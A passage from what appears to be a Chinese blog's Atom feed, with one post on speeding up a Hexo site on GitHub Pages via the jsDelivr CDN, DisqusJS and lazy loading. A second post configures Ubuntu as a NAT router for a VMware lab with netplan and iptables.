class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;</span><br></pre></td></tr></table></figure><p>考虑到jsDelivr默认缓存时间是7天，如果我们想要修改实时生效而不需要等到缓存过期，最适合的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F; github用户名 &#x2F; 库名 @ 版本号或者tag &#x2F; 路径&#x2F;文件名</span><br></pre></td></tr></table></figure><p>我们可以通过打tag来访问同一个资源文件的不同版本，而不需要考虑缓存时间</p><h3 id="替换链接"><a href="#替换链接" class="headerlink" title="替换链接"></a>替换链接</h3><p>大部分hexo主题并不会对使用到的 js\css\图片\字体 套上CDN，我们来手动替换</p><h4 id="css样式表"><a href="#css样式表" class="headerlink" title="css样式表"></a>css样式表</h4><p>大部分css样式会在 <code>head</code> 标签里面引入，这里的css样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意</p><p>我将我使用的主题的 style.css \ rtl.css \ disquesjs.css 替换成jsDelivr，明显提升了等待时间</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/speedup-github-page/head.jpg" loading="lazy" class="" title="[head css]"><p>还有一些其他地方的css引入</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/speedup-github-page/css2.jpg" loading="lazy" class="" title="[css in style]"><h4 id="js脚本"><a href="#js脚本" class="headerlink" title="js脚本"></a>js脚本</h4><p>寻找并替换各种调用到的js脚本</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/speedup-github-page/js1.jpg" loading="lazy" class="" title="[css in style]"><p>main.js</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/speedup-github-page/js2.jpg" loading="lazy" class="" title="[css in style]"><p>disqusjs.js</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/speedup-github-page/js3.jpg" loading="lazy" class="" title="[css in style]"><p>还有其他的一些地方，不一一列举了</p><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><p>字体需要特别注意，通常情况下比较大，耗时比较长</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/speedup-github-page/font1.jpg" loading="lazy" class="" title="[font replace]"><p>我使用的主题使用的字体通过 <code>all.min.css</code> 引入，因为前面这个css样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过jsDelivr引入了</p><h4 id="img小图片"><a href="#img小图片" class="headerlink" title="img小图片"></a>img小图片</h4><p>一般是 logo 等资源，根据主题自行替换</p><blockquote><p>更新：为了更好的控制版本和决定是否使用jsDelivr, 可以将这个地方独立出来放到配置文件里</p></blockquote><p>_config.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cdn:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://cdn.jsdelivr.net/gh/zu1k/hexoblog@0.0.1.2</span></span><br></pre></td></tr></table></figure><p>用到的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- styles --&gt;</span><br><span class="line">&lt;% if (theme.cdn.enabled) &#123; %&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&lt;%&#x3D; theme.cdn.url %&gt;&#x2F;css&#x2F;style.css&quot;&gt;</span><br><span class="line">&lt;% &#125; else &#123; %&gt;</span><br><span class="line">  &lt;%- css(&#39;css&#x2F;style&#39;) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line"></span><br><span class="line">其他的地方同样的方法</span><br></pre></td></tr></table></figure><h2 id="加载时文字可见"><a href="#加载时文字可见" class="headerlink" title="加载时文字可见"></a>加载时文字可见</h2><p>无论怎样优化，字体加载的时间无法忽略，这段时间的网页文字显示为空，这给用户带来卡顿感</p><p>我们必须使字体加载时文字可见，这样才能弥补github pages的慢</p><p>具体方法是将各 <code>@font-face</code> 中 <code>font-display</code> 设置为 <code>swap</code>, 这样可以在字体未加载完时临时使用系统字体替代，加载完后重新渲染字体</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/speedup-github-page/font-swap.jpg" loading="lazy" class="" title="[font display]"><p>每一个地方都需要改，自己搜索吧</p><h2 id="使用DisqusJS"><a href="#使用DisqusJS" class="headerlink" title="使用DisqusJS"></a>使用DisqusJS</h2><p>由于众所周知的原因，disqus被墙了，国内访问不了，而大部分hexo网站都使用disqus作为评论系统，这导致网页会卡在评论区的加载上，虽然网页已经加载完了，但进度条还在进行，给用户带来慢的感觉。</p><p>并且，即使有的用户翻墙能够访问Disqus，但Disqus 本身非常笨重，各种 CSS/JS/Font/API 加起来请求不小于 2MB，当 Disqus 加载时，浏览器会在主线程中同步解析、渲染 Disqus，造成卡顿感。</p><p>在上网搜索之后，找到了一个替代方案，那就是苏卡卡大佬的 DisqusJS，大家可以根据教程对自己博客的主题进行修改</p><p>参考链接：</p><ul><li><a href="https://blog.skk.moe/post/disqusjs/" target="_blank" rel="noopener">https://blog.skk.moe/post/disqusjs/</a></li><li><a href="https://disqusjs.skk.moe/" target="_blank" rel="noopener">https://disqusjs.skk.moe/</a></li><li><a href="https://github.com/SukkaW/DisqusJS" target="_blank" rel="noopener">https://github.com/SukkaW/DisqusJS</a></li></ul><p>对于使用的Disqus API反代，我自己测试发现苏卡卡大佬提供的速度不太行，不知道是什么原因，所以推荐自己进行搭建，我是用的是zeit进行搭建，感觉还不错</p><blockquote><p>如果disqusJS默认样式不适合自己的主题，推荐fork原库进行修改，注意要使用1.2.6，最新的master在懒加载上有点问题</p></blockquote><h2 id="使用懒加载"><a href="#使用懒加载" class="headerlink" title="使用懒加载"></a>使用懒加载</h2><p>如果图片和评论区随着页面在一开始就加载，势必会拖累网页首次渲染和文字的迅速显示，这里最好的办法是使用懒加载技术</p><h3 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h3><p>对于图片，我使用了 <code>hexo-lazyload-image</code> 这个插件</p><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-lazyload-image --save</span><br></pre></td></tr></table></figure><p>配置文件中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  onlypost: <span class="literal">false</span></span><br><span class="line">  loadingImg: https://cdn.jsdelivr.net/gh/zu1k/hexoblog@0.0.1.2/images/loading.png</span><br></pre></td></tr></table></figure><blockquote><p>顺便给懒加载添加了cdn功能，可以替换成cdn链接来加速</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-lazyload-image-cdn --save</span><br></pre></td></tr></table></figure><p>配置文件中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span> </span><br><span class="line">  onlypost: <span class="literal">false</span></span><br><span class="line">  loadingImg: <span class="comment"># eg ./images/loading.gif</span></span><br><span class="line">  cdn:</span><br><span class="line">    enabled: <span class="literal">false</span></span><br><span class="line">    url: https://cdn.com</span><br></pre></td></tr></table></figure><h3 id="评论懒加载"><a href="#评论懒加载" class="headerlink" title="评论懒加载"></a>评论懒加载</h3><p>对于评论区，很多情况下用户根本不会划到页面底部（文章写得太烂没人看得下去）。</p><p>所以我这里对 disqus 的加载使用懒加载技术，参考 <a href="https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/" target="_blank" rel="noopener">https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/</a></p><p>我使用的是 disqusJS, 下面给出加载的js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- DisqusJS Comments --&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span> (theme.disqusjs.enabled &amp;&amp; theme.disqusjs.shortname)&#123; %&gt;</span><br><span class="line">  &lt;script crossorigin defer src=<span class="string">"https://cdn.jsdelivr.net/gh/zu1k/DisqusJS@1.2.6.3/dist/disqus.js"</span> id=<span class="string">"disqusjs-script"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script&gt;</span></span><br><span class="line"><span class="regexp">    document.getElementById("disqusjs-script").addEventListener("load",function() &#123;</span></span><br><span class="line"><span class="regexp">      setTimeout(</span></span><br><span class="line"><span class="regexp">        function() &#123;</span></span><br><span class="line"><span class="regexp">          function t() &#123;</span></span><br><span class="line"><span class="regexp">            var dsqjs = new DisqusJS(&#123;</span></span><br><span class="line"><span class="regexp">                  shortname: '&lt;%= theme.disqusjs.shortname %&gt;',</span></span><br><span class="line"><span class="regexp">                  siteName: '&lt;%= theme.disqusjs.siteName %&gt;',</span></span><br><span class="line"><span class="regexp">                  api: '&lt;%= theme.disqusjs.api %&gt;',</span></span><br><span class="line"><span class="regexp">                  apikey: '&lt;%= theme.disqusjs.apikey %&gt;',</span></span><br><span class="line"><span class="regexp">                  admin: '&lt;%= theme.disqusjs.admin %&gt;',</span></span><br><span class="line"><span class="regexp">                  adminLabel: '&lt;%= theme.disqusjs.adminLabel %&gt;'</span></span><br><span class="line"><span class="regexp">              &#125;);</span></span><br><span class="line"><span class="regexp">          &#125;</span></span><br><span class="line"><span class="regexp">          var runningOnBrowser = typeof window !== "undefined";</span></span><br><span class="line"><span class="regexp">          var isBot = runningOnBrowser &amp;&amp; !("onscroll" in window) || typeof navigator !== "undefined" &amp;&amp; /</span>(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);</span><br><span class="line">          <span class="keyword">var</span> supportsIntersectionObserver = runningOnBrowser &amp;&amp; <span class="string">"IntersectionObserver"</span> <span class="keyword">in</span> <span class="built_in">window</span>;</span><br><span class="line">          <span class="keyword">if</span> (!isBot &amp;&amp; supportsIntersectionObserver) &#123;</span><br><span class="line">              <span class="keyword">var</span> disqus_observer = <span class="keyword">new</span> IntersectionObserver(<span class="function"><span class="keyword">function</span>(<span class="params">entries</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (entries[<span class="number">0</span>].isIntersecting) &#123;</span><br><span class="line">                  t();</span><br><span class="line">                  disqus_observer.disconnect();</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;, &#123; <span class="attr">threshold</span>: [<span class="number">0</span>] &#125;);</span><br><span class="line">              disqus_observer.observe(<span class="built_in">document</span>.getElementById(<span class="string">'disqus_thread'</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            t();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;, <span class="number">1</span>);</span><br><span class="line">    &#125;,!<span class="number">0</span></span><br><span class="line">  );</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;% &#125; %&gt;</span></span><br></pre></td></tr></table></figure><h2 id="终极大招"><a href="#终极大招" class="headerlink" title="终极大招"></a>终极大招</h2><p>如果经过上面的优化，你还对博客的加载速度不满意，那一定是github pages服务器在美国的原因，200+ms的延迟导致首字节返回时间不短</p><p>其实支持通过Github仓库代码进行构建，部署为静态网站的平台不值github pages一家，我使用过的比较好的是 <code>zeit.co</code> ， 国内访问走的是台湾的gcp节点，延迟低速度快，推荐</p><p>具体使用方法非常简单，自行摸索吧</p><blockquote><p>更新: 刚知道，如果更新太快的话，zeit会暂停构建部署的</p><p>You are pushing commits at a very fast pace (across the whole organization).<br>Due to that, we cannot deploy the commit e80751b.</p><p>You can try again later or upgrade your plan.</p></blockquote><h2 id="辅助优化"><a href="#辅助优化" class="headerlink" title="辅助优化"></a>辅助优化</h2><p>使用谷歌提供的 <a href="https://developers.google.com/speed/pagespeed/insights/" target="_blank" rel="noopener">Pagespeed Insights</a> 工具分析网页加载并根据建议进行优化</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;相信不少小伙伴都在使用Github Pages提供的免费静态网站托管来搭建自己的博客，但是因为墙的存在和特殊国情，使用Github Page
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="github" scheme="https://blog.lgf.im/tags/github/"/>
    
      <category term="jsdelivr" scheme="https://blog.lgf.im/tags/jsdelivr/"/>
    
      <category term="gulp" scheme="https://blog.lgf.im/tags/gulp/"/>
    
  </entry>
  
  <entry>
    <title>使用iptables将ubuntu配置为路由器</title>
    <link href="https://blog.lgf.im/2020/ubuntu-iptables-nat.html"/>
    <id>https://blog.lgf.im/2020/ubuntu-iptables-nat.html</id>
    <published>2020-03-18T05:15:40.000Z</published>
    <updated>2020-06-18T05:55:26.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>使用 vmware 分别创建win7和ubuntu两个虚拟机</p></blockquote><h3 id="ubuntu-18-04"><a href="#ubuntu-18-04" class="headerlink" title="ubuntu 18.04"></a>ubuntu 18.04</h3><p>充当网关路由器</p><p>网卡1(WAN口)：桥接公网</p><p>网卡2(LAN口)：vmnet15</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/ubuntu-iptables-nat/ubuntuvm.png" loading="lazy" class="" title="[vmware win7]"><h3 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h3><p>充当内网客户机</p><p>网卡：vmnet15</p><blockquote><p>vmnet15不使用vmware的配置，使用一个空的vmnet</p></blockquote><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/ubuntu-iptables-nat/win7vm.png" loading="lazy" class="" title="[vmware win7]"><h2 id="ubuntu-配置"><a href="#ubuntu-配置" class="headerlink" title="ubuntu 配置"></a>ubuntu 配置</h2><h3 id="开启ipv4-forward"><a href="#开启ipv4-forward" class="headerlink" title="开启ipv4 forward"></a>开启ipv4 forward</h3><p>修改 <code>/etc/sysctl.conf</code> 开启ipv4的forward功能，将下面的注释打开，如果没有手动添加。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/ubuntu-iptables-nat/ipv4forward.png" loading="lazy" class="" title="[ipv4 forward]"><p><code>sysctl -p</code> 生效</p><h3 id="配置网卡信息"><a href="#配置网卡信息" class="headerlink" title="配置网卡信息"></a>配置网卡信息</h3><p><code>ip addr</code> 查看所有网卡的名称和信息</p><p>ubuntu18.04使用netplan管理网络，修改其配置文件</p><p><code>sudo nano /etc/netplan/50-cloud-init.yaml</code></p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/ubuntu-iptables-nat/ubuntu-net.png" loading="lazy" class="" title="[ubuntu net]"><p>使用 <code>netplan try</code> 检查配置是否正确，如果正确自动应用生效</p><h3 id="配置iptables规则"><a href="#配置iptables规则" class="headerlink" title="配置iptables规则"></a>配置iptables规则</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//清空已有规则防止干扰</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line">//进、出、转发默认允许</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line">//将从子网网段来的连接nat到eno33网卡(互联网)，ip改为外网ip</span><br><span class="line">iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -o eno33 -j SNAT --to-source 192.168.254.129</span><br><span class="line"></span><br><span class="line">//添加伪装</span><br><span class="line">iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -j MASQUERADE</span><br></pre></td></tr></table></figure><h2 id="win7-设置"><a href="#win7-设置" class="headerlink" title="win7 设置"></a>win7 设置</h2><p>修改网卡配置如图</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/ubuntu-iptables-nat/win7.png" loading="lazy" class="" title="[vmware win7]"><p>win7即可通过ubuntu这个网关上网</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot; class=&quot;headerlink&quot; title=&quot;实验环境&quot;&gt;&lt;/a&gt;实验环境&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;使用 vmware 分别创建win7和ubuntu两个虚拟机&lt;/p&gt;
&lt;/blockquote&gt;

      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="iptables" scheme="https://blog.lgf.im/tags/iptables/"/>
    
  </entry>
  
</feed>
